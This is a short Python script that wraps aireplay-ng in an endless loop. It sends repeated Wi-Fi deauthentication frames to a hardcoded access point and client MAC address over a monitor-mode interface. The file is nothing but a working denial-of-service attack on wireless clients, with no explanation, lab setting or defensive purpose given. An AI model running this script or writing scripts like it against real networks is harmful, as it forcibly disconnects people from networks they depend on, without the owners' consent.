import os
import time

BSSID = "98:A9:00:40:51:00"
DEVICE_MAC = "D8:00:9A:09:00:DC"
INTERFACE = "wlan0mon"


def deauth_attack(bssid, device_mac, interface):
    while True:
        os.system(
            f"sudo aireplay-ng --deauth 10 -a {bssid} -c {device_mac} {interface}"
        )
        time.sleep(1)


if __name__ == "__main__":
    deauth_attack(BSSID, DEVICE_MAC, INTERFACE)
